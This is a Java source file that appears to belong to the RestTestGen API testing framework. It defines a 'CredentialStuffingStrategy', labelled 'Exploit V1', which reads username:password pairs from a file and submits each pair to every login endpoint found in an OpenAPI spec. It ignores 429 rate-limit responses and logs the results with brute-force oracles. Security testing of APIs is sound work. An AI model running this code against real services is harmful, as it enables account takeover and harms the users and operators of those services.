package io.resttestgen.implementation.strategy;

import io.resttestgen.core.Environment;
import io.resttestgen.core.datatype.HttpStatusCode;
import io.resttestgen.core.datatype.OperationSemantics;
import io.resttestgen.core.datatype.parameter.leaves.LeafParameter;
import io.resttestgen.core.openapi.Operation;
import io.resttestgen.core.testing.Strategy;
import io.resttestgen.core.testing.TestRunner;
import io.resttestgen.core.testing.TestSequence;
import io.resttestgen.implementation.fuzzer.NominalFuzzer;
import io.resttestgen.implementation.oracle.BruteStatusCodeOracle;
import io.resttestgen.implementation.oracle.StatusCodeOracle;
import io.resttestgen.implementation.writer.ReportWriter;
import io.resttestgen.implementation.writer.RestAssuredWriter;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.io.IOException;
import java.util.List;
import java.util.stream.Collectors;
import java.nio.file.*;
import java.util.stream.Stream;


// Exploit V1
public class CredentialStuffingStrategy extends Strategy {

    private static final Logger logger = LogManager.getLogger(CredentialStuffingStrategy.class);
    private static final String CREDENTIALS_FILE = "test.txt";

    public void start() {
        TestRunner runner = TestRunner.getInstance();
        runner.removeInvalidStatusCode(new HttpStatusCode(429));

        List<Operation> operations = Environment.getInstance().getOpenAPI()
                .getOperations().stream().filter(operation -> operation.getCrudSemantics() == OperationSemantics.LOG_IN)
                .collect(Collectors.toList());
        if (operations.isEmpty()) {
            System.out.println("No LOG_IN operations found in the OpenAPI documentation.");
            return;
        }

        // Read from the file
        try (Stream<String> stream = Files.lines(Paths.get(CREDENTIALS_FILE))) {
            stream.forEach(credentials -> {
                String[] parts = credentials.split(":");
                String username = parts[0];
                String password = parts[1];

                for (Operation operation : operations) {
                    TestSequence attemptsSequence = new TestSequence();
                    NominalFuzzer nominalFuzzer = new NominalFuzzer(operation);
                    TestSequence sequence = nominalFuzzer.generateTestSequences(1).get(0);
                    // Injecting the username and password
                    List<LeafParameter> leaves = (List<LeafParameter>) sequence.get(0).getFuzzedOperation().getLeaves();
                    for (LeafParameter leafParam : leaves) {
                        String paramNameLower = leafParam.getName().toString().toLowerCase();
                        if (paramNameLower.contains("password")) {
                            leafParam.setValue(password);
                        } else if (paramNameLower.contains("username") || paramNameLower.contains("email") || paramNameLower.contains("userid")
                                || paramNameLower.contains("realm") || paramNameLower.contains("login") || paramNameLower.contains("name") || paramNameLower.contains("operationId"))
                        {
                            leafParam.setValue(username);
                        }
                    }

                    attemptsSequence.append(sequence);

                    runner.run(attemptsSequence);
                    StatusCodeOracle statusCodeOracle = new StatusCodeOracle();
                    statusCodeOracle.assertTestSequence(attemptsSequence);

                    BruteStatusCodeOracle bruteStatusCodeOracle = new BruteStatusCodeOracle();
                    bruteStatusCodeOracle.assertTestSequence(attemptsSequence);

                    try {
                        ReportWriter reportWriter = new ReportWriter(attemptsSequence);
                        reportWriter.write();
                        RestAssuredWriter restAssuredWriter = new RestAssuredWriter(attemptsSequence);
                        restAssuredWriter.write();
                    } catch (IOException e) {
                        logger.warn("Could not write report to file.");
                        e.printStackTrace();
                    }
                }
            });
        } catch (IOException e) {
            logger.error("Error reading credentials file.", e);
        }
    }
}